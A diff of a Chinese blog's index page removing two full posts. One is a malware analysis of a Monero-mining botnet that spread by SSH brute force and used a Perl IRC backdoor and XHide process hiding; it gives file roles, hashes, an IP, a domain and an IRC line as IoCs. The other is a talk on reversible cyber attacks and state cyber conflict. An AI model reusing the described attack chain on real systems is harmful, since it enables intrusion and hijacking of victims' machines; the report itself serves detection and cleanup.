-<h4 id="20文件"><a href="#20文件" class="headerlink" title="..%20文件"></a>..%20文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-26.jpg" alt="图-26"><br>..%20文件是一个源自TeaMrx Perlbot的Perl IRC后门。启动后可以从配置列表中随机选定一个伪装成特定进程，使用从配置列表中随机选定昵称在指定的undernet.org提供的IRC服务频道中接收C&amp;C指令。</p>
-<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-27.jpg" alt="图-27"><br>通过分析2个样本Perl IRC后门主要更新体现在IRC服务、矿池地址、昵称列表和伪装进程列表方面。</p>
-<h3 id="挖矿模块"><a href="#挖矿模块" class="headerlink" title="挖矿模块"></a>挖矿模块</h3><h4 id="olduser-taz文件"><a href="#olduser-taz文件" class="headerlink" title="olduser.taz文件"></a>olduser.taz文件</h4><p>olduser.taz内有14个文件，主要功能如下：</p>
-<table>
-<thead>
-<tr>
-<th>文件名称</th>
-<th>主要功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>..%20</td>
-<td>Perl版本的IRC后门</td>
-</tr>
-<tr>
-<td>autorun</td>
-<td>增加、更新定时任务并启动update和perl后门</td>
-</tr>
-<tr>
-<td>bte.py</td>
-<td>python版本的加解密、编解码工具</td>
-</tr>
-<tr>
-<td>cfg</td>
-<td>perl后门的配置文件</td>
-</tr>
-<tr>
-<td>cron</td>
-<td>准备添加的定时任务</td>
-</tr>
-<tr>
-<td>cron.d</td>
-<td>默认模板的计划任务，</td>
-</tr>
-<tr>
-<td>dir</td>
-<td>恶意程序存放位置的配置文件</td>
-</tr>
-<tr>
-<td>h32</td>
-<td>32位版本的XHide程序</td>
-</tr>
-<tr>
-<td>h64</td>
-<td>64位版本的XHide程序</td>
-</tr>
-<tr>
-<td>m.dir</td>
-<td>指向/lib/dev的配置文件</td>
-</tr>
-<tr>
-<td>pid</td>
-<td>恶意程序的pid文件</td>
-</tr>
-<tr>
-<td>run</td>
-<td>根据硬件架构选择启动对应run32\run64的shell脚本</td>
-</tr>
-<tr>
-<td>run32</td>
-<td>32位版本的Python IRC后门程序</td>
-</tr>
-<tr>
-<td>run64</td>
-<td>64位版本的Python IRC后门程序</td>
-</tr>
-</tbody></table>
-<h4 id="go文件"><a href="#go文件" class="headerlink" title="go文件"></a>go文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-28.jpg" alt="图-28"><br>go文件是一个bash脚本文件，主要功能是根据系统的硬件架构把对应的ELF程序复制成crond文件并执行，然后执行perl脚本的IRC后门，最后删除恶意文件，并清空历史记录。</p>
-<p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-29.jpg" alt="图-29"></p>
-<h4 id="i686-x86-64-crond文件"><a href="#i686-x86-64-crond文件" class="headerlink" title="i686\x86_64\crond文件"></a>i686\x86_64\crond文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-30.jpg" alt="图-30"><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-31.jpg" alt="图-31"></p>
-<p>i686文件是一个经过upx加壳的linux/i386版本的xmrig程序；<br>X86_64\crond文件是一个经过upx加壳的linux/amd64版本的xmrig程序。</p>
-<p>主要功能是门罗币挖矿，其根据xmrig的开源代码做定制开发，用于僵尸网络时，可以指定矿池的静态IP地址，规避DNS解析，以逃避安全检测。</p>
-<h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><h4 id="scn-db文件"><a href="#scn-db文件" class="headerlink" title="scn.db文件"></a>scn.db文件</h4><p>scn.db内有6个文件，主要功能如下：</p>
-<table>
-<thead>
-<tr>
-<th>文件名称</th>
-<th>主要功能</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>passfile</td>
-<td>文件中3个文件存放(印度?)常见的账号密码，用于口令暴力破解。</td>
-</tr>
-<tr>
-<td>scanate</td>
-<td>存放一些代理服务器（俄罗斯）。</td>
-</tr>
-<tr>
-<td>201–22</td>
-<td>存放210.212.0.0网段的地址。</td>
-</tr>
-<tr>
-<td>auto</td>
-<td>网段扫描器</td>
-</tr>
-<tr>
-<td>brute</td>
-<td>SSH账号密码暴破工具</td>
-</tr>
-<tr>
-<td>masscan</td>
-<td>Masscan扫描器</td>
-</tr>
-<tr>
-<td>scan</td>
-<td>Legion2000 开发的扫描器,扫描特定网段(如210.212.0.0-210.212.255.255)</td>
-</tr>
-<tr>
-<td>start</td>
-<td>SSH banner爬虫</td>
-</tr>
-<tr>
-<td>vuln.txt</td>
-<td>存放暴破是否成功结果文件</td>
-</tr>
-</tbody></table>
-<h4 id="auto文件"><a href="#auto文件" class="headerlink" title="auto文件"></a>auto文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-32.jpg" alt="图-32"><br>auto文件是一个bash脚本文件，主要功能是根据A段地址生成B网段扫描任务。</p>
-<h4 id="start文件"><a href="#start文件" class="headerlink" title="start文件"></a>start文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-33.jpg" alt="图-33"><br>start文件是一个bash脚本文件，主要功能是根据指定的网段地址和端口，爬取SSH服务地址，并用预置的账号密码文件爆破。</p>
-<h4 id="scan文件"><a href="#scan文件" class="headerlink" title="scan文件"></a>scan文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-34.jpg" alt="图-34"><br>scan文件是一个linux/amd64版本的ELF文件，Legion2000 开发的扫描器，可以扫描指定的网段。</p>
-<h4 id="brute文件"><a href="#brute文件" class="headerlink" title="brute文件"></a>brute文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-35.jpg" alt="图-35"><br>brute文件是一个linux/amd64版本的ELF文件，主要功能是对指定的IP验证预置的SSH账号密码是否能登录成功。</p>
-<h4 id="bte-py文件"><a href="#bte-py文件" class="headerlink" title="bte.py文件"></a>bte.py文件</h4><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-36.jpg" alt="图-36"><br>bte.py是一个python脚本文件，主要提供使用特定密码的加密、解密方法。</p>
-<h2 id="IoCs"><a href="#IoCs" class="headerlink" title="IoCs"></a>IoCs</h2><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><table>
-<thead>
-<tr>
-<th>文件名称</th>
-<th>SHA256</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>x86_64</td>
-<td>d10cb54fe685afdc56f59f1f328276b7027b5367d3dd5131362dd085fef03c7d</td>
-</tr>
-<tr>
-<td>i686</td>
-<td>090e8053cfeb8591e33907c1cb4e6fc1f593623851b2cd0022ef1c1472b4cfa1</td>
-</tr>
-<tr>
-<td>h32</td>
-<td>45ed59d5b27d22567d91a65623d3b7f11726f55b497c383bc2d8d330e5e17161</td>
-</tr>
-<tr>
-<td>h64</td>
-<td>7fe9d6d8b9390020862ca7dc9e69c1e2b676db5898e4bfad51d66250e9af3eaf</td>
-</tr>
-<tr>
-<td>run32</td>
-<td>bc5c36eca38fb2379062a02e2a5f08fe89f73964bfedba38ce301f828d35ab2e</td>
-</tr>
-<tr>
-<td>run64</td>
-<td>e312c04b07209f4e5f98cbc9dbd0b1e495717e2d87ba5d61d4163e2aa02cff52</td>
-</tr>
-<tr>
-<td>olduser.tgz</td>
-<td>cd5166885f266cdb5afa5c780e7375ce11dd2a28fd0605aba4e2cb6f27a4d33a</td>
-</tr>
-<tr>
-<td>scn.db</td>
-<td>7b1070b413f70a00f8b5f0fd480761873367b38dcdee96a6832e1b43a5d0e374</td>
-</tr>
-<tr>
-<td>brute</td>
-<td>3c00611b670b128c1ca6d3c6f0e9522eea385e0670e74a9b2b26325b4e13c864</td>
-</tr>
-<tr>
-<td>masscan</td>
-<td>9aa8a11a52b21035ef7badb3f709fa9aa7e757788ad6100b4086f1c6a18c8ab2</td>
-</tr>
-<tr>
-<td>scan</td>
-<td>60cb56218ecc73cb4262f363c8563aa42a1bff63e5d8b218d79702567b908ae9</td>
-</tr>
-</tbody></table>
-<h3 id="失陷主机"><a href="#失陷主机" class="headerlink" title="失陷主机"></a>失陷主机</h3><p><a href="ftp://153.122.137.67">ftp://153.122.137.67</a><br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-37.jpg" alt="图-37"></p>
-<h3 id="Domain"><a href="#Domain" class="headerlink" title="Domain"></a>Domain</h3><p>olduser-v4.pwndns.pw</p>
-<h3 id="IRC"><a href="#IRC" class="headerlink" title="IRC"></a>IRC</h3><p>USER zwsiewale xx.xx.xx.xx Bucharest.RO.EU.WeakNet.eu :tupa<br><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-38.jpg" alt="图-38"></p>
-<h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p><img src="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E5%9B%BE-39.jpg" alt="图-39"><br>综上所述，此种安全攻击事件以SSH口令爆破为突破口，使用XHide隐藏伪装恶意程序进程、并把境外IRC服务作为C&amp;C，在增加内网SSH弱口令爆破的横向渗透模块后更具危害性。我们提醒企业用户强化SSH口令，使用上文中的IoC检测、清除恶意文件。</p>
-
+          <p>2019年08月08日，stxletto检测到一起利用SSH口令爆破感染、XHide隐藏伪装恶意程序进程、IRC服务作为C&C的门罗币挖矿事件。从捕获的多个样本来看，7月份的样本较5月份的样本，增加了内网SSH弱口令爆破的横向渗透模块，更具危害性。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/08/08/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%AE%97%E9%97%A8%E7%BD%97%E5%B8%81%E6%8C%96%E7%9F%BF%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1199,13 +509,6 @@
 
               <time title="创建时间：2018-10-28 13:00:00" itemprop="dateCreated datePublished" datetime="2018-10-28T13:00:00+08:00">2018-10-28</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-05 23:26:37" itemprop="dateModified" datetime="2020-05-05T23:26:37+08:00">2020-05-05</time>
-              </span>
 
           
 
@@ -1218,143 +521,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="可逆性网络攻击与防御"><a href="#可逆性网络攻击与防御" class="headerlink" title="可逆性网络攻击与防御"></a>可逆性网络攻击与防御</h1><p>寻龙千万看缠山，一重缠是一重关。攻防对抗有着悠久而形式多样的历史，在网络化的今日也进入了新的领域。网络安全威胁持续蔓延，并可以武器化被有组织的加速扩大，安全问题已经从个人上升到企业层面甚至国家层面。分析利用、调查取证、溯源归因、恢复加固件件都不是轻松的事情。</p>
-<p>有一群穿着格子衫背着双肩包的年轻人，他们中不乏段子手、理论家、操作神，也有文艺青年。他们是普通的开发者，也是这场网络攻防对抗的主角，也会一起分享和探讨安全领域的前沿技术和发展趋势。</p>
-<p>深澜深蓝(stxletto)，在安全行业浸染十余年，多次参与响应网络高危漏洞、国家级会议网络安全保障，拥有丰富的从业经验。其致力于高级威胁识别与缓解方向，曾主导设计并实现了新一代安全产品重要模块，拥有多篇技术发明专利。</p>
-<p>面对组织化、商业化、武器化的安全趋势，stxletto倡议应该尤其注意可逆性网络攻击及防御，提炼先进的模型思想，构建深度分层防御体系。在2018年10月某安全会议中，stxletto做了《可逆性网络攻击与防御》的主题分享，本主题在特朗普废止PPD-20并签署新的美国国家网络战略的时代背景下，从已经发生的网络攻击实际案例中揭示可逆性攻击的趋势、梳理总结网络攻击发起方式。以安全三要素为支点，介绍赛博空间的三类威胁，总结四种潜在的可逆性攻击形式及四大基础应用，最后结合经典的攻击链模型钻石模型，和安全从业者们共同解读一个实际案例中的深度分层体系防御方案。</p>
-<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="美国废除-PPD-20"><a href="#美国废除-PPD-20" class="headerlink" title="美国废除 PPD-20"></a>美国废除 PPD-20</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-1.png" alt="图-1"></p>
-<p>2018年9月20日，美国总统特朗普签署新的国家网络战略。</p>
-<p>这项政策这代替了前总统奥巴马2012年签署的“第20号总统政策指令”（Presidential Policy Directive 20，PPD-20）。“PPD-20”中要求，进攻型行动需要经过美国政府批准。主要目的是控制那些超出日常数字间谍活动或计算机利用行动。如果发起具有重大后果的行动，除了需跨机构小组同意，还需取得总统的批准。</p>
-<h3 id="美国新版国家网络战略"><a href="#美国新版国家网络战略" class="headerlink" title="美国新版国家网络战略"></a>美国新版国家网络战略</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-2.png" alt="图-2"></p>
-<h4 id="三大特点"><a href="#三大特点" class="headerlink" title="三大特点"></a>三大特点</h4><ul>
-<li>战略对手瞄准中俄；</li>
-<li>战略布局立足构建体系；</li>
-<li>战略目标侧重服务经济。</li>
-</ul>
-<h4 id="四大支柱"><a href="#四大支柱" class="headerlink" title="四大支柱"></a>四大支柱</h4><ul>
-<li>保护美国人民、美国国土和美国生活方式；</li>
-<li>促进美国繁荣；</li>
-<li>以实力维护和平；</li>
-<li>提升美国影响力</li>
-</ul>
-<h4 id="从三个方面进行网络空间博弈"><a href="#从三个方面进行网络空间博弈" class="headerlink" title="从三个方面进行网络空间博弈"></a>从三个方面进行网络空间博弈</h4><p>网络人才招录、网络武器研发、网络战力生成。</p>
-<p>网络战略统领各项网络事务，显示新战略不局限于网络安全方向，必须服务于整体美国国家利益和战略目标  国防基础设施、商业数据、知识产权及公众隐私信息</p>
-<h3 id="传统制裁手段的缺点"><a href="#传统制裁手段的缺点" class="headerlink" title="传统制裁手段的缺点"></a>传统制裁手段的缺点</h3><p>2018年12月6日，华为CFO孟晚舟女士在加拿大转机时，被加拿大当局代表美国政府暂时扣留，美国正在寻求对孟晚舟女士的引渡，面临纽约东区未指明的指控。</p>
-<p>2018年9月20日，美国宣布由于中国军方购买俄罗斯军火，违反了美国2017年颁布的全面制裁法。对中国中央军事委员会装备发展部及其部长李尚福中将实施制裁。</p>
-<p>制裁本质上是公开的，如果它在实施后退缩，会导致主导者的额外声誉成本。</p>
-<h3 id="混合对抗"><a href="#混合对抗" class="headerlink" title="混合对抗"></a>混合对抗</h3><ul>
-<li>政治战</li>
-<li>外交战</li>
-<li>经济战</li>
-<li>舆论战</li>
-<li>心理战</li>
-<li>法律战</li>
-<li>传统战</li>
-<li>网络战</li>
-</ul>
-<h4 id="网络战的优点"><a href="#网络战的优点" class="headerlink" title="网络战的优点"></a>网络战的优点</h4><ul>
-<li>迅速</li>
-<li>隐蔽</li>
-<li>精确</li>
-<li>可控</li>
-<li>可逆</li>
-<li>成本低</li>
-<li>回报高</li>
-<li>攻防兼备</li>
-</ul>
-<h4 id="全面网络战争的缺点"><a href="#全面网络战争的缺点" class="headerlink" title="全面网络战争的缺点"></a>全面网络战争的缺点</h4><ul>
-<li>顾忌对手的网络报复手段</li>
-<li>害怕由网络战引发常规战争</li>
-</ul>
-<h3 id="可逆性网络攻击"><a href="#可逆性网络攻击" class="headerlink" title="可逆性网络攻击"></a>可逆性网络攻击</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>可逆性网络攻击是指不以摧毁对方为目的，选用结果可逆的或攻击停止后可恢复对象功能的技术实现战术目标的对抗过程。</p>
-<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
-<li>影响可被缓解、减少和逆转；</li>
-<li>可能以隐蔽的方式进行，使双方更灵活的进退。</li>
-</ul>
-<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>被攻击者对系统失去信心，误判导致将其视为沉没成本。</p>
-<h4 id="趋势"><a href="#趋势" class="headerlink" title="趋势"></a>趋势</h4><p>传统攻击中，瘫痪敌方设施的唯一途径是物理性摧毁。使用网络战，你能使之瘫痪，但冲突过后，设施能恢复运行。</p>
-<p>斯坦福大学的网络安全研究员Max Smeets表示：“战争行动就是棍棒加胡萝卜。虽然网络行动通常被认为可以惩罚或增加对手的成本，但是如果网络行动是可逆的，则可以增加“胡萝卜”效应，对一些敌人的可能行为做出奖励反应。 可逆性网络攻击类似于经济制裁，但更有效。</p>
-<p>可逆性网络攻击的概念类似于勒索软件，当犯罪分子将数据作为“人质”索取“赎金”。可逆攻击性网络攻击的一个例子是加密对手的数据以强制改变敌人行为，然后在达成协议后解密该信息。</p>
-<p>在未来，不可逆网络攻击可能会被解释为违反战争法规。</p>
-<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="2010-年美以攻击伊朗核电站"><a href="#2010-年美以攻击伊朗核电站" class="headerlink" title="2010 年美以攻击伊朗核电站"></a>2010 年美以攻击伊朗核电站</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-3.png" alt="图-3"><br>通过U盘进入核电站内部网络的Stuxnet导致纳坦兹核设施大约五分之一离心机瘫痪。图中右侧显示器中的灰点表示离线的离心机，数量明显偏多。</p>
-<h3 id="2013-年伊朗黑客攻击纽约市鲍曼大坝控制系统"><a href="#2013-年伊朗黑客攻击纽约市鲍曼大坝控制系统" class="headerlink" title="2013 年伊朗黑客攻击纽约市鲍曼大坝控制系统"></a>2013 年伊朗黑客攻击纽约市鲍曼大坝控制系统</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-4.png" alt="图-4"></p>
-<p>鲍曼大坝位于纽约市以北不到20英里（合32公里）的地方，在2013年花费2百万美元修缮后，包含一个15英尺宽（1英尺=0.3048米），2.5英尺高的水闸，主要用于防洪，灌溉下游庄稼。</p>
-<p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-5.png" alt="图-5"></p>
-<p>2013年伊朗黑客利用Google搜索技巧确定了纽约市鲍曼大坝控制系统的系统漏洞。由于鲍曼大道水坝正在修复，在当时处于离网状态，任何尝试远程操纵的操作都会失败。伊朗黑客试图接管的举动还是引起了美国调查人员的不安。</p>
-<h3 id="2015-年俄罗斯攻击乌克兰电网"><a href="#2015-年俄罗斯攻击乌克兰电网" class="headerlink" title="2015 年俄罗斯攻击乌克兰电网"></a>2015 年俄罗斯攻击乌克兰电网</h3><p>2015年12月23日，乌克兰首都基辅部分地区和乌克兰西部的 140 万名居民断电数小时。电力系统是由发电、输电、变电、配电和用电连接成的统一整体，在整个电力系统中，几乎每个环节都依赖计算机技术的支撑，比如各级电网调度控制中心的计算机系统、变电站的计算机监控系统等。</p>
-<p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-6.png" alt="图-6"><br><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-7.png" alt="图-7"></p>
-<p>黑客通过邮件向电力公司员工发送了恶意的office文件，欺骗其下载了一款恶意软件“BlackEnergy”(黑暗力量)。该恶意软件最早可追溯到2007年，由俄罗斯地下黑客组织开发并广泛使用，包括用来“刺探”全球各国的电力公司。</p>
-<p>当天，黑客攻击了约60座变电站。黑客首先操作恶意软件将电力公司的主控电脑与变电站断连，随后又在系统中植入病毒，让电脑全体瘫痪。与此同时，黑客还对电力公司的电话通讯进行了干扰，导致受到停电影响的居民无法和电力公司进行联系。</p>
-<h3 id="2016-年俄罗斯操作美国总统大选"><a href="#2016-年俄罗斯操作美国总统大选" class="headerlink" title="2016 年俄罗斯操作美国总统大选"></a>2016 年俄罗斯操作美国总统大选</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-8.png" alt="图-8"></p>
-<p>俄罗斯黑客渗透进民主党全国委员会的电子邮件服务器，还入侵了希拉里·克林顿(Hillary Clinton)的竞选团队主席约翰·D·波德斯塔(John D. Podesta)的私人电子邮件帐户。</p>
-<p>没有证据表明来自俄罗斯或其他地方的黑客篡改了票数。俄罗斯“对选举采取黑客行动”，指的是某种比改变选票本身微妙得多的东西。</p>
-<p>告诉你什么是已知的东西，什么不是；还有什么是事实，什么是错误的理解。</p>
-<h3 id="2018-年沙特阿拉伯记者失踪事件"><a href="#2018-年沙特阿拉伯记者失踪事件" class="headerlink" title="2018 年沙特阿拉伯记者失踪事件"></a>2018 年沙特阿拉伯记者失踪事件</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-9.png" alt="图-9"></p>
-<p>卡舒吉在10月2日进入沙特驻伊斯坦布尔领事馆之后失踪。土耳其官方声称，已经掌握了卡舒吉在领馆内被谋杀的视频和音频证据。</p>
-<h3 id="NSA历史事件"><a href="#NSA历史事件" class="headerlink" title="NSA历史事件"></a>NSA历史事件</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-10.png" alt="图-10"></p>
-<h4 id="网络漏洞流入"><a href="#网络漏洞流入" class="headerlink" title="网络漏洞流入"></a>网络漏洞流入</h4><ul>
-<li>经济刺激，赏金计划；</li>
-<li>文化吸引，名人堂+感谢信；</li>
-</ul>
-<h4 id="网络漏洞流出"><a href="#网络漏洞流出" class="headerlink" title="网络漏洞流出"></a>网络漏洞流出</h4><p>瓦森纳协定（Wassenaar Arrangement，WA） 对漏洞、零日漏洞、入侵软件进行开发、测试、评估、产品化现在都受到了限制。如果没有获得许可就开始出口，有可能被视为非法行为。</p>
-<h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><h3 id="攻击发起方式"><a href="#攻击发起方式" class="headerlink" title="攻击发起方式"></a>攻击发起方式</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-11.png" alt="图-11"></p>
-<h3 id="安全三要素"><a href="#安全三要素" class="headerlink" title="安全三要素"></a>安全三要素</h3><ul>
-<li><p>保密性(Confidentiality)<br>很多网络攻击都是从窃取或复制目标的个人信息开始的，包括各种各样的犯罪攻击活动，如信用卡欺诈、身份盗窃、或盗取比特币钱包。国家间谍也将保密性攻击作为其工作的重要部分，试图获取政治、军事或经济利益方面的机密信息</p>
-</li>
-<li><p>完整性(Integrity)<br>完整性攻击是为了破坏、损坏、摧毁信息或系统，以及依赖这些信息或系统的人。完整性攻击可以是小范围的篡改和破坏，也可以是大规模的对目标进行破坏。攻击者的范围可以从脚本小子到国家间谍组织。</p>
-</li>
-<li><p>可用性(Availability)<br>阻止目标访问数据是如今勒索软件和拒绝服务(DoS)攻击最常见的形式。勒索软件一般会加密目标设备的数据，并索要赎金进行解密。拒绝服务(DoS)攻击(通常以分布式拒绝服务攻击的形式)向目标发送大量的请求占用网络资源，使网络资源不可用。</p>
-</li>
-</ul>
-<h3 id="网络空间的三类威胁"><a href="#网络空间的三类威胁" class="headerlink" title="网络空间的三类威胁"></a>网络空间的三类威胁</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-12.png" alt="图-12"></p>
-<h4 id="探查、开采、利用"><a href="#探查、开采、利用" class="headerlink" title="探查、开采、利用"></a>探查、开采、利用</h4><p>从别人的网络中窃取信息，这是当前最普遍、最现实的威胁</p>
-<h4 id="中断、扰乱、否定"><a href="#中断、扰乱、否定" class="headerlink" title="中断、扰乱、否定"></a>中断、扰乱、否定</h4><p>通过僵尸网络、拒绝服务等手段，阻塞信道、占用服务器资源、毁坏数据和软件，使网络不能正常运转</p>
-<h4 id="摧毁、破坏、瘫痪"><a href="#摧毁、破坏、瘫痪" class="headerlink" title="摧毁、破坏、瘫痪"></a>摧毁、破坏、瘫痪</h4><p>典型的硬杀伤，通常会引起有形的物理毁坏、经济损失乃至人员伤亡。</p>
-<h3 id="网络空间四类可逆性攻击"><a href="#网络空间四类可逆性攻击" class="headerlink" title="网络空间四类可逆性攻击"></a>网络空间四类可逆性攻击</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-13.png" alt="图-13"></p>
